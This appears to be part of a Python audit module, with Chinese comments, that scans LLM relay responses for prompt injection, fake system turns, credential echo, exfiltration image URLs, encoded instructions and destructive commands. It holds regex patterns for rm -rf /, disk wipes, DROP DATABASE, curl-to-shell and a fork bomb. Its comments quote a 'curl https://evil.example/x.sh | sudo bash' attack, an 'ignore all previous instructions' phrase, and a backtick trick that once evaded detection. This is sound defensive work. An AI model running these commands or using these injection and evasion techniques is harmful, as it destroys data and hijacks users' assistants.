                decoded = re.sub(r"\\u([0-9a-fA-F]{4})",
                                 lambda mm: chr(int(mm.group(1), 16)), m.group(0))
                out.append(decoded + text[m.end():m.end() + _DECODE_CONTEXT_CHARS])
                out.append(text[max(0, m.start() - _DECODE_CONTEXT_CHARS):m.start()] + decoded)
            except Exception:
                continue
        for m in _HTML_ENTITY_RUN_RE.finditer(text):
            if len(out) >= _DECODE_MAX_CANDIDATES * 2:
                break
            try:
                frag = re.sub(r"&#x([0-9a-fA-F]+);", lambda mm: chr(int(mm.group(1), 16)),
                              m.group(0), flags=re.I)
                frag = re.sub(r"&#([0-9]+);", lambda mm: chr(int(mm.group(1))), frag)
                out.append(frag + text[m.end():m.end() + _DECODE_CONTEXT_CHARS])
                out.append(text[max(0, m.start() - _DECODE_CONTEXT_CHARS):m.start()] + frag)
            except Exception:
                continue
    except Exception:
        return out
    return out


def _mask_creds_in(snippet):
    """证据文本里的凭据形态抹掉（审计红线：凭据任何片段都不落库）。"""
    out = str(snippet or "")
    for rx, kind in _CREDENTIAL_PATTERNS + SECRET_REGEX_PATTERNS:
        try:
            out = rx.sub("<%s>" % kind, out)
        except Exception:
            continue
    return out


def _marker_is_turn_anchored(seg, start):
    """标记是否落在**行首**（允许行首的空白、反引号与引号）—— 真实模板分隔符的形状。

    这是区分「讲解引用」与「伪造系统轮次」的判据（审计 L7）。
    真实的分隔符在文本里必然是行级结构（`<|im_start|>system` 独占行首，
    下一行才是内容），而讲解时的引用几乎总是嵌在句子里
    （「ChatML 用 `<|im_start|>system` 开始系统轮次」）。

    ⚠️ **为什么不用「跳过行内反引号」这个更直觉的做法**（实测否掉了）：
    标记同时是 `payload_indicators` 的来源，而 `instruction_override`
    的定罪条件是「同现载荷」。把反引号内的标记整个抹掉之后，
    攻击者只要写成 `` `<|im_start|>system` `` 就能让**整条检测链塌掉**
    （实测：`请你忽略以上所有指令…` + 反引号包裹的标记 → 零告警）。
    那是给攻击者开了个后门，比误报严重得多。
    行首判据不碰文本，只收紧「算不算数」，不存在这条逃逸路径。

    ⚠️ 已知取舍：两个标记都写在句中（`你现在是 <|im_start|>system<|im_end|> 模式`）
    不再触发标记信号。这类文本没有行级结构、模型不会当成真的轮次边界，
    代价可接受；其中的危害话术仍由 `_INSTRUCTION_OVERRIDE_RE` 独立兜底。
    """
    line_start = seg.rfind("\n", 0, start) + 1
    return seg[line_start:start].strip(" \t`'\"") == ""


def _split_code_blocks(text):
    """把文本分成 [(segment, in_code_block)] 列表。"""
    if not text:
        return []
    parts = []
    in_code = False
    buf = []
    for line in (text or "").split("\n"):
        if line.strip().startswith("```"):
            if buf:
                parts.append(("\n".join(buf), in_code))
                buf = []
            in_code = not in_code
            parts.append((line, True))
            continue
        buf.append(line)
    if buf:
        parts.append(("\n".join(buf), in_code))
    return parts


def _code_block_ranges(text):
    """扫描 ``` 围栏，返回代码块在原文里的**字符区间** [(start, end)]。

    与 `_split_code_blocks` 同源，但产出绝对偏移：判断「某个正则命中是否落在代码块内」
    必须知道位置，而 `_split_code_blocks` 只给文本片段（拼回原文时偏移已丢失）。
    围栏行本身（```与闭合围栏）算作块内：紧邻围栏的命令行同样属于示例。
    未闭合的围栏视为一直延伸到文末（与 `_split_code_blocks` 的语义一致）。
    """
    ranges = []
    pos = 0
    start = None
    for line in (text or "").split("\n"):
        line_start = pos
        # +1 = 被 split 吃掉的换行符（末行没有，多算一位不影响区间包含判定）
        pos += len(line) + 1
        if line.strip().startswith("```"):
            if start is None:
                start = line_start
            else:
                ranges.append((start, line_start + len(line)))
                start = None
    if start is not None:
        ranges.append((start, pos))
    return ranges


# ========== 凭据检测正则（复用 transparent.RULES 的形态，但纯 stdlib 不依赖 mitmproxy）==========
# 审计规则专项 P2：响应侧凭据回流扫描——恶意 relay 回显其他用户 key/模型幻觉出看似真实的 key。
_CREDENTIAL_PATTERNS = [
    (re.compile(r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{20,}"), "github_token"),
    (re.compile(r"AIza[0-9A-Za-z_-]{35}"), "google_api_key"),
    (re.compile(r"LTAI[A-Za-z0-9]{12,20}"), "aliyun_ak"),
    (re.compile(r"AKID[A-Za-z0-9]{13,20}"), "tencent_ak"),
    (re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,}"), "slack_token"),
    (re.compile(r"[sr]k_(?:live|test)_[0-9A-Za-z]{20,}"), "stripe_key"),
    (re.compile(r"AKIA[A-Z0-9]{16}"), "aws_ak"),
    (re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"), "jwt"),
]


def credential_echo_kinds():
    """本模块实际产出的凭据回流 kind（顺序与 `_CREDENTIAL_PATTERNS` 一致）。

    event_store 的读侧降噪谓词按 kind 名拼接 LIKE 前缀，两边各写一遍必然漂移；
    kind 名单的唯一定义源是 `credential_labels.CREDENTIAL_ECHO_KINDS`，
    由 `tests/test_audit.py::test_credential_echo_kinds_stay_in_sync` 守死一致。
    """
    return tuple(kind for _rx, kind in _CREDENTIAL_PATTERNS)


def _url_evidence(url, payload_length):
    """自动外发 URL 的安全证据：不落 query 数据，只保留 host/长度/摘要。"""
    try:
        parsed = urlsplit(url)
        host = parsed.hostname or "?"
    except Exception:
        host = "?"
    try:
        digest = hashlib.sha256(url.encode("utf-8")).hexdigest()[:16]
    except Exception:
        digest = "?"
    return (
        f"exfil_url host={host[:120]} len={len(url)} sha256={digest} "
        f"[渲染即自动请求，query 载荷 {payload_length} 字符]"
    )


def dedupe_findings(items):
    """按 (kind, evidence) 去重，重复次数并进 evidence。

    生产库实测：同一条响应里一个命令出现四次，就写了四条一模一样的记录
    （同 sid、同 evidence、相隔几毫秒）。次数本身是有用信息，
    但不该变成四行告警——四条相同告警只会让人以为是 bug，然后关掉整个功能。
    """
    out, index = [], {}
    for f in items:
        key = (f.get("kind", ""), f.get("evidence", ""))
        hit = index.get(key)
        if hit is not None:
            hit["_n"] = hit.get("_n", 1) + 1
            continue
        index[key] = f
        out.append(f)
    for f in out:
        n = f.pop("_n", 1)
        if n > 1:
            f["evidence"] = f"{f.get('evidence', '')} (x{n})"
    return out


def scan_response_poison(text, request_text=None):
    """S6 响应投毒扫描。

    Args:
        text: 已 restore 的响应文本。
        request_text: 对应的请求体文本（可空）。用于「回声抑制」——
            请求里本来就有的东西，上游并没有「注入」任何新内容。
            这是最有效的一条去噪规则：编程助手的对话里危险命令、
            内网地址、key 天天出现，只有上游**凭空多出来**的才值得报。

    返回 [{signal, severity, evidence, kind}]，已按 (kind, evidence) 去重。
    隐藏 Unicode 全文扫；外链仅扫非 code block 段。
    """
    if not text:
        return []
    results = []
    # 同一条回复里已出现的**客观载荷**指标：既用于给泛化句式（instruction_override）
    # 定罪，也作为「编码绕过」二次扫描的跳过依据。
    payload_indicators = []

    # 隐藏 Unicode（全文），分档见常量注释
    high_hits = _HIDDEN_UNICODE_HIGH.findall(text)
    if high_hits:
        chars = ",".join(f"U+{ord(c):04X}" for c in high_hits[:5])
        results.append({
            "signal": "response_poison",
            "severity": HIGH,
            "evidence": f"hidden_unicode: {chars} (count={len(high_hits)}) [双向覆盖符]",
            "kind": "hidden_unicode",
        })
        payload_indicators.append("bidi_override")
    low_hits = _HIDDEN_UNICODE_LOW.findall(text)
    if len(low_hits) >= _HIDDEN_LOW_THRESHOLD:
        chars = ",".join(f"U+{ord(c):04X}" for c in low_hits[:5])
        results.append({
            "signal": "response_poison",
            "severity": MEDIUM,
            "evidence": f"hidden_unicode: {chars} (count={len(low_hits)}) [零宽字符成规模出现]",
            "kind": "hidden_unicode",
        })
        payload_indicators.append("hidden_unicode")

    # 自动拉取型外链（非 code block——code block 里的图片不会被渲染，拉不出去）
    for seg, in_code in _split_code_blocks(text):
        if in_code:
            continue
        for m in _AUTOFETCH_URL_RE.finditer(seg):
            url = m.group(1) or m.group(2) or ""
            payload = _EXFIL_PAYLOAD_RE.search(url) if url else None
            # 没有数据载荷就是一张普通图片，闭嘴。宁可漏报也不能天天报错图。
            if not payload:
                continue
            results.append({
                "signal": "response_poison",
                "severity": HIGH,
                "evidence": _url_evidence(url, len(payload.group(1))),
                "kind": "exfil_url",
            })
            payload_indicators.append("exfil_url")

    # 凭据回流扫描（审计规则专项 P2）：检测回复中出现 API key/token/JWT 形态的串。
    # 场景：恶意 relay 回显其他用户 key（钓鱼/嫁祸），或模型幻觉出看似真实的 key。
    #
    # ⚠️ 分级降档（W1-1，2026-09-22 审批）：本规则**无法区分真实凭据与教学示例**——
    # 编程助手在代码块里写 `.env` 模板、CI 密钥示例是家常便饭，实测生产库这类命中
    # 以 MEDIUM 灌满审计页，还被套上「响应投毒 / Unicode 控制符」的文案解释，
    # 用户读到的是「我被攻击了」。故按**客观结构**分档，既不删规则、也不判意图：
    #   · 代码块内 或 低熵（短串/有序序列/Shannon 熵 <= 阈值） → LOW  + [示例形态]
    #     （默认 floor=MEDIUM 下不入库；门槛调到 LOW 仍可查，不丢可查性）
    #   · 其余（非代码块 + 高熵）                            → MEDIUM + [疑似真实凭据]
    # 与 S9 同哲学：形态可判、意图不可判 → 示例形态只记不报，真阳性照旧可见。
    code_ranges = _code_block_ranges(text) if text else []
    for rx, kind in _CREDENTIAL_PATTERNS:
        for m in rx.finditer(text):
            # 请求里本来就有这串 = 用户自己发上去的 key 被原样回显，不是「回流」。
            # 这种情况归 S1 error_leak 管（它专门看 4xx/5xx 的报错体）。
            if request_text and m.group() in request_text:
                continue
            value = m.group()
            in_code = any(s <= m.start() < e for s, e in code_ranges)
            is_sample = (
                in_code
                or len(value) < _ENV_VALUE_MIN_LEN
                or _is_ordered_seq(value)
                or _value_entropy(value) <= _ENV_VALUE_MIN_ENTROPY
            )
            results.append({
                "signal": "response_poison",
                "severity": LOW if is_sample else MEDIUM,
                "evidence": (_redact_evidence(value, kind)
                             + (f" {CREDENTIAL_ECHO_SAMPLE_MARKER}" if is_sample
                                else f" {CREDENTIAL_ECHO_REAL_MARKER}")),
                "kind": f"credential_echo:{kind}",
            })

    # ── S6 扩展：提示词注入 / 系统提示词索要 / 凭据外发指令（2026-09-19）──
    # 分档与回声抑制规则见文件上方常量块的设计说明。
    # 标记只在**非代码块**正文里数，且至少一个必须**行首锚定**（审计 L7）。
    # 两层缺一不可：
    #   · 跳过代码围栏 —— 讲解模板最常写进 ``` 块；
    #   · 要求行首锚定 —— 只跳围栏不够，审计报告自己举的例子是**行内**形态
    #     （「ChatML 用 `<|im_start|>system` 开始…」），实测修完围栏后它仍误报 MEDIUM。
    # 与下方「伪系统标题」判定口径统一（那条本来就已经跳过代码块）。
    markers = []
    anchored = False
    for _seg, _in_code in _split_code_blocks(text):
        if _in_code:
            continue
        for _m in _FAKE_SYSTEM_MARKER_RE.finditer(_seg):
            markers.append(_m.group(0))
            if _marker_is_turn_anchored(_seg, _m.start()):
                anchored = True
    if (len(markers) >= 2 and anchored
            and not (request_text and all(mk in request_text for mk in set(markers)))):
        results.append({
            "signal": "response_poison",
            "severity": MEDIUM,
            "evidence": (f"fake_system_block: {','.join(sorted(set(markers)))[:60]} "
                         f"(count={len(markers)}) [伪造协议级系统轮次]"),
            "kind": "fake_system_block",
        })
        payload_indicators.append("fake_system_block")

    for seg, in_code in _split_code_blocks(text):
        if in_code:
            continue
        for m in _FAKE_SYSTEM_HEADING_RE.finditer(seg):
            snippet = m.group(0).strip()
            if request_text and snippet in request_text:
                continue
            results.append({
                "signal": "response_poison",
                "severity": MEDIUM,
                "evidence": f"fake_system_block: {_mask_creds_in(snippet[:40])} [正文出现伪系统标题]",
                "kind": "fake_system_block",
            })
            payload_indicators.append("fake_system_block")
            break
        break        # 只扫第一段非 code block 正文，避免同一形态重复报

    for m in _PROMPT_EXTRACT_RE.finditer(text):
        snippet = m.group(0)
        if request_text and snippet in request_text:
            continue
        results.append({
            "signal": "response_poison",
            "severity": MEDIUM,
            "evidence": f"prompt_extraction: {_mask_creds_in(snippet[:80])}",
            "kind": "prompt_extraction",
        })
        payload_indicators.append("prompt_extraction")
        break

    for m in _CREDENTIAL_EXFIL_RE.finditer(text):
        snippet = m.group(0)
        if request_text and snippet in request_text:
            continue
        results.append({
            "signal": "response_poison",
            "severity": MEDIUM,
            "evidence": f"credential_exfil_instruction: {_mask_creds_in(snippet[:80])}",
            "kind": "credential_exfil_instruction",
        })
        payload_indicators.append("credential_exfil_instruction")
        break

    # 泛化指令覆盖：**单独出现不报**（模型讲解提示词注入时就会写出这句话），
    # 只有同一段回复里另有客观载荷时才定罪。
    if payload_indicators:
        for m in _INSTRUCTION_OVERRIDE_RE.finditer(text):
            snippet = m.group(0)
            if request_text and snippet in request_text:
                continue
            results.append({
                "signal": "response_poison",
                "severity": MEDIUM,
                "evidence": (f"instruction_override: {_mask_creds_in(snippet[:80])} "
                             f"[同现载荷: {','.join(sorted(set(payload_indicators)))}]"),
                "kind": "instruction_override",
            })
            break

    # 编码绕过：直接扫描零命中时，解码候选片段后再扫一遍（只认指令类判据）。
    # ⚠️ 候选只从**非代码块**正文里抽（审计 L7）：代码块里出现 base64 是常态
    # （图片/哈希/文件内容/示例数据），解码后碰巧命中一条宽泛的英文句式就报
    # MEDIUM 是纯噪声。真正的编码绕过是把话术塞进**回复正文**，不在围栏里。
    if not results:
        prose = "\n".join(seg for seg, in_code in _split_code_blocks(text) if not in_code)
        for decoded in _decode_candidates(prose)[:_DECODE_MAX_CANDIDATES]:
            if not (_INSTRUCTION_OVERRIDE_RE.search(decoded) or _PROMPT_EXTRACT_RE.search(decoded)
                    or _CREDENTIAL_EXFIL_RE.search(decoded) or _FAKE_SYSTEM_MARKER_RE.search(decoded)):
                continue
            digest = hashlib.sha256(decoded.encode("utf-8", "replace")).hexdigest()[:16]
            results.append({
                "signal": "response_poison",
                "severity": MEDIUM,
                "evidence": (f"encoded_instruction: {_mask_creds_in(decoded[:80])} "
                             f"[base64/转义解码后命中注入判据 len={len(decoded)} sha256={digest}]"),
                "kind": "encoded_instruction",
            })
            break

    return dedupe_findings(results)


# ========== S7 cross_request_pollution：跨请求污染（仅主动探针） ==========
def scan_cross_request_pollution(text, prior_canary_nonces):
    """S7 检测当前响应里出现前序请求的 canary nonce。

    prior_canary_nonces: 之前请求注入过的 nonce 集合（不含本次）。
    命中=relay 跨请求泄漏。
    返回 [{signal, severity, evidence, kind}]。
    """
    if not text or not prior_canary_nonces:
        return []
    results = []
    for nonce in prior_canary_nonces:
        if nonce in text:
            results.append({
                "signal": "cross_request_pollution",
                "severity": HIGH,
                "evidence": f"prior_canary_recur: {nonce}",
                "kind": "prior_canary",
            })
    return results


# ========== S8 prompt_leak：系统提示词泄漏检测（审计规则专项 P2）==========
# 主动探针 gen_prompt_extraction_probes 发了提取请求，但缺 prompt_leak scanner。
# 检测回复中出现系统提示词特征短语（不追求精确，只挡明显泄漏）。
# 【已删除】S8 prompt_leak（_PROMPT_LEAK_MARKERS + scan_prompt_leak）
#
# 原实现是 5 条英文正则，猜「You are a helpful assistant」「Your instructions are」
# 这类系统提示词句式。两个致命问题：
#   1. 句式是无限集合，穷举不完（与 S9 词表同类问题）；
#   2. 只覆盖英文——中文系统提示词一条都认不出来，而这个产品的用户主要说中文。
# 也就是说它对真实场景近乎无效，却占着一个「已检测」的名分，比没有更糟。
#
# 真要做，唯一可靠的形态是对比式：由主动探针注入一段**我们自己生成的随机**
# 系统提示词，回复里出现那段随机串才算泄漏（与 S5 canary 同一范式，零知识库）。
# 那属于主动探针的能力，不是被动流量能做的，等 canary 体系需要时再加。

# ========== 聚合 ==========
def aggregate_passive(findings_lists):
    """被动模式总判：聚合多个信号检测结果为单一严重度。

    findings_lists: [[finding, ...], ...] 各信号结果列表。
    返回 {severity, counts: {signal: count}, total}。
    """
    counts = {}
    total = 0
    top = LOW
    for findings in findings_lists:
        for f in findings:
            sig = f.get("signal", "")
            counts[sig] = counts.get(sig, 0) + 1
            total += 1
            if severity_ge(f.get("severity", LOW), top):
                top = f.get("severity", LOW)
    return {"severity": top, "counts": counts, "total": total}


# ========== S9 危险动作检测（模型下发的破坏性命令） ==========
# 只做「告警 + 留证」，不做拦截。理由：
#   1) Maskit 只能改/挡 HTTP 响应，做不到「暂停并问你一句」——挡掉之后 agent 可能
#      重试，或者你丢掉半小时的工作，体验比不挡更糟；
#   2) 客户端（Claude Code / Cursor 等）本来就有权限确认，再来一层是噪音不是安全；
#   3) 误报代价远高于漏报：`rm -rf node_modules` 天天有人跑，挡错一次用户就把整个
#      功能关掉，等于零。
# 所以这里只认「几乎不可能是正常操作」的高置信度形态，宁可漏，不可扰。
#
# 局限必须说清楚：这是安全网不是保险柜。命令写进脚本文件再执行、用变量拼接、
# 换个工具名，都能绕过。它能挡住的是「AI 手滑直接下发 rm -rf /」这一类。
# S9 危险命令：**结构可判**的形态才保留（删根/擦盘/格式化/删库/资源滥用），
# 命令词表型（curl|sh、npm i -g 等）已随「审计不硬编码」删除——客户端执行前有确认，
# 且意图判定不可靠。**severity 恒 LOW**（只记不报）：形态检测客观，意图判定不是。
# 每条结构 (regex, kind, desc)——不含严重度：S9 永不高报（形态可判，意图不可判）。
_DANGER_PATTERNS = [
    # 删根 / 删盘符 / 删家目录：rm -rf / 、rm -rf /* 、rm -fr ~ 、rm -rf C:\
    (re.compile(r"(?i)\brm\s+(?:-[a-z]*[rf][a-z]*\s+)+(?:/|/\*|~|~/\*|[A-Za-z]:[\\/]?)(?:\s|$|;|&|\|)"),
    "destructive_fs", "递归删除根目录/家目录"),
    # Windows 全盘删除
    (re.compile(r"(?i)(?:^|[\s;&|])(?:del|erase)\s+/[sq]\b[^\n]{0,40}[A-Za-z]:[\\/]?(?:\s|$)"),
    "destructive_fs", "Windows 全盘删除"),
    (re.compile(r"(?i)\bformat\s+[A-Za-z]:"), "destructive_fs", "格式化磁盘"),
    (re.compile(r"(?i)\bRemove-Item\b[^\n]{0,60}-Recurse\b[^\n]{0,40}-Force\b[^\n]{0,20}[A-Za-z]:\\(?:\s|$|\")"),
    "destructive_fs", "PowerShell 递归强删盘符"),
    # 磁盘直写
    (re.compile(r"(?i)\bdd\s+[^\n]{0,60}\bof=/dev/(?:sd[a-z]|nvme\d|disk\d)"),
    "destructive_disk", "dd 直写块设备"),
    (re.compile(r"(?i)\bmkfs(?:\.\w+)?\s+/dev/"), "destructive_disk", "格式化块设备"),
    # 数据库：DROP DATABASE / TRUNCATE / 无 WHERE 的 DELETE|UPDATE
    (re.compile(r"(?i)\bdrop\s+(?:database|schema)\b"), "destructive_db", "删除数据库"),
    (re.compile(r"(?i)\bdrop\s+table\b"), "destructive_db", "删除表"),
    (re.compile(r"(?i)\btruncate\s+table\b"), "destructive_db", "清空表"),
    (re.compile(r"(?i)\bdelete\s+from\s+[`\"\[\]\w.]+\s*(?:;|$)"), "destructive_db", "DELETE 无 WHERE"),
    # 表名限 ASCII 起头：`\w` 在 Python 3 连中文一起匹配，实测把中文散文
    # 「update 改为显式 set」当成了无 WHERE 的 UPDATE 语句报 HIGH。
    # WHERE 前瞻改成 `[^;]{0,400}?`：真实 SQL 的 WHERE 常在下一行，
    # 原来的 `[^\n]*` 只看同一行，实测把带完整 WHERE 的多行语句判成无 WHERE。
    # 用 `[^;]` 而不是 `[\s\S]` 是为了不跨过语句结束符去捡下一段里的 where。
    (re.compile(r"(?i)\bupdate\s+[A-Za-z_][`\"\[\]\w.]*\s+set\b(?![^;]{0,400}?\bwhere\b)"),
    "destructive_db", "UPDATE 无 WHERE"),
    # 版本控制：一律 LOW。**不是漏检，是刻意压到默认视图之外。**
    # force push / reset --hard / clean -fd 是日常开发操作（rebase 完就要强推），
    # 而且全部可恢复（reflog、远程副本、客户端本来就会二次确认），
    # 距离本节开头写的「几乎不可能是正常操作」差得远。
    # 实测 10413 条真实回复里 5 条强推命中，4 条是模型在**讨论**强推
    # （其中两条还是在写「Git 防护确认弹窗」的界面文案），精确率 20%。
    # 调 severity_floor=LOW 仍然查得到。
    (re.compile(r"(?i)\bgit\s+push\b[^\n]{0,60}(?:--force(?!-with-lease)|(?<![\w-])-f(?![\w-]))"),
     "destructive_vcs", "git 强推（非 --force-with-lease）"),
    (re.compile(r"(?i)\bgit\s+reset\s+--hard\b"), "destructive_vcs", "git reset --hard"),
    (re.compile(r"(?i)\bgit\s+clean\s+-[a-z]*f[a-z]*d|\bgit\s+clean\s+-[a-z]*d[a-z]*f"),
    "destructive_vcs", "git clean 删除未跟踪文件"),
    # 集群 / 云资源
    (re.compile(r"(?i)\bkubectl\s+delete\b[^\n]{0,60}(?:--all\b|\bns(?:amespace)?\s)"),
     "destructive_infra", "kubectl 批量删除"),
    (re.compile(r"(?i)\bterraform\s+destroy\b"), "destructive_infra", "terraform destroy"),
    (re.compile(r"(?i)\baws\s+s3\s+rb\b[^\n]{0,40}--force"), "destructive_infra", "删除 S3 桶"),
    # 危险的「下载即执行」。
    # curl 与管道之间**必须夹一个 URL 形态的参数**：原来 `[^\n|]{0,80}` 允许零字符，
    # 于是散文里写的 `curl|sh` 这种简写（实测三条命中全是在讨论审计规则本身，
    # 原文是「_SHELL_INJECTION_RE（rm -rf/curl|sh/wget|sh/npm -g）」）照样报 HIGH。
    # 真实的下载即执行必然带地址，加这个约束不漏任何真形态。
    (re.compile(r"(?i)\bcurl\b[^\n|]{0,100}?(?:https?://|\bwww\.|[\w\-]+\.[a-z]{2,}/)"
                r"[^\n|]{0,100}\|\s*(?:sudo\s+)?(?:ba)?sh\b"),
    "remote_exec", "curl 管道直接执行"),
    (re.compile(r"(?i)\bwget\b[^\n|]{0,100}?(?:https?://|\bwww\.|[\w\-]+\.[a-z]{2,}/)"
                r"[^\n|]{0,100}\|\s*(?:sudo\s+)?(?:ba)?sh\b"),
    "remote_exec", "wget 管道直接执行"),
    # fork 炸弹
    (re.compile(r":\(\)\s*\{\s*:\|\s*:&\s*\}\s*;\s*:"), "resource_abuse", "fork 炸弹"),
]


# 讲解/举例语境标记。命中这些说明模型在**描述**命令而不是**要求执行**，
# 危险动作信号据此降级（不是删掉——万一是伪装成讲解的诱导）。
#
# 英文一律用**短语 + 词边界**，不用裸词。真实测试里 `curl … https://evil.example/x.sh
# | sudo bash` 这条明确攻击被漏掉了，原因就是域名 `evil.example` 里的 "example"
# 命中了裸词分支——而 example.com / example.org 是 RFC 2606 保留域名，
# 文档和攻击 PoC 里遍地都是。裸的 avoid / dangerous 同理去掉：
# 一句「this is dangerous, run curl|sh」反而会被自己降级。
# 【已删除】_EXPLANATORY_RE / _IMPERATIVE_RE / _IMPERATIVE_NEAR_RE / _URL_STRIP_RE
#
# 这三张表是想判断「模型是在讲解命令，还是在叫你执行命令」。做不到。
# 判定意图属于自然语言理解，正则只能穷举措辞，而措辞是无限集合：
# 真实上游连测四轮，每轮都逼出一个新词——补「示例」，撞上「你运行」；
# 去掉「你」，撞上「会立即执行」（描述不是祈使）；再补否定前瞻……
# 每一轮都只是把误报推到下一个句式，永远收敛不了，何况还有英文和其它语言。
#
# 结论：S9 不再试图判断意图，严重度恒定 LOW（默认 severity_floor=MEDIUM 不入库）。
# 它退化成一份**可查的命令记录**，不再是告警源。真正的控制点在客户端——
# Claude Code / Cursor 执行命令前本来就要用户确认。
def scan_dangerous_action(text, request_text=None):
    """S9：扫描模型下发的破坏性动作。

    Args:
        text: 已还原的响应文本，或工具调用参数拼接后的字符串。
              必须用**还原后**的文本——占位符状态下路径/主机名都是假的，
              判不准也没意义。
        request_text: 对应的请求体文本（可空）。命令在请求里已经出现过时不报，
              理由见 scan_response_poison 的 request_text 说明。

    返回 [{signal, severity, evidence, kind}]。同一 kind 只报一次，
    避免一段脚本里十条 rm 刷出十条告警把日志淹了。
    """
    if not text or not isinstance(text, str):
        return []
    out = []
    seen_kind = set()
    for rx, kind, desc in _DANGER_PATTERNS:
        if kind in seen_kind:
            continue
        # 回声抑制：请求里已经有同一条命令 = 用户自己问的（或上下文带进来的），
        # 上游没有凭空多给任何东西。跳过被抑制的匹配继续找下一处，
        # 而不是整个 kind 放弃——否则「问过一次 rm，之后真被注入」就漏了。
        m = None
        for cand in rx.finditer(text):
            if request_text and cand.group(0).strip() in request_text:
                continue
            m = cand
            break
        if m is None:
            continue
        seen_kind.add(kind)
        snippet = m.group(0).strip()
        if len(snippet) > 120:
            snippet = snippet[:117] + "..."
        out.append({
            "signal": "dangerous_action",
            # 恒 LOW：见文件上方「已删除词表」一节。检测命令**形态**是客观的
            # （rm + 递归标志 + 根路径是语法结构），判断**意图**不是，所以只记不报。
            "severity": LOW,
            "evidence": f"{desc}: {snippet}",
            "kind": kind,
        })
    return out


# ========== 隔离性硬保证：永不抛异常 ==========
#
# 本模块的硬约束是「永不抛异常（失败返回空列表）」，但原来只靠
# 每个函数自己小心 + 一条测了 None 和错类型标量的单测。实测（2026-08-17 外部审计）
# 传入任意对象时 scan_sse_anomaly / dedupe_findings / scan_response_poison /
# scan_cross_request_pollution / scan_tool_call_rewrite / aggregate_passive 全部抛
# TypeError 或 AttributeError——约束根本没被守住。（S5 scan_canary_leak 已于
# 2026-08-18 随「当前请求回显不能证明泄漏」一并移除。）
#
# 调用方 transparent._audit_response 外层确实有 try/except，所以流量不受影响。
# 但那个 except 一旦触发就是 return：**这条响应上已经收集、还没写库的审计发现
# 会被整体静默丢弃**。审计的价值在于「出事时查得到」，静默漏记比报错更糟。
#
# 所以改成结构保证而不是纪律保证：按前缀自动包裹，新增 scan_* 信号零成本继承。
# 逐个函数写 try/except 做不到这点——总会有人新加一个信号时忘了。
def _never_raises(fn, fallback):
    """包一层兜底。fallback 是**工厂函数**，每次返回新对象，避免共享可变默认值。"""
    @functools.wraps(fn)
    def guarded(*args, **kwargs):
        try:
            return fn(*args, **kwargs)
        except Exception:
            return fallback()
    guarded.__wrapped_by_never_raises__ = True
    return guarded


def _empty_aggregate():
    return {"severity": LOW, "counts": {}, "total": 0}


# 返回列表的：全部 scan_* 加上去重助手
for _n, _f in list(globals().items()):
    if callable(_f) and (_n.startswith("scan_") or _n == "dedupe_findings"):
        globals()[_n] = _never_raises(_f, list)
del _n, _f

# 返回聚合字典的单独给形状对得上的兜底——返回 [] 会让调用方拿 agg["severity"] 再炸一次
aggregate_passive = _never_raises(aggregate_passive, _empty_aggregate)
# 返回判定字符串的：失败按「无法判定」处理，不能返回 None（调用方会当成有效值比对）
classify_tool_echo = _never_raises(classify_tool_echo, lambda: "unknown")
